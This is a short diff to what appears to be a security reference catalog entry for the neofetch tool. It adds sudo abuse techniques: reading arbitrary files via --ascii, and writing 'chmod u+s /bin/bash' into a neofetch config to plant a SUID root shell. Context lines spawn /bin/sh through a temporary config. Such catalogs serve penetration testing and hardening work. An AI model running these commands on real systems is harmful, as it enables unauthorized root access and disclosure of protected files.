@@ -12,6 +12,13 @@ functions:
         neofetch --ascii $LFILE
   sudo:
     - code: |
+        LFILE=file_to_read
+        sudo neofetch --ascii $LFILE
+    - code: |
+        export XDG_CONFIG_HOME=$HOME/.config
+        echo "chmod u+s /bin/bash" > $XDG_CONFIG_HOME/neofetch/config.conf
+        sudo neofetch \"\"
+    - code: |
         TF=$(mktemp)
         echo 'exec /bin/sh' >$TF
         sudo neofetch --config $TF
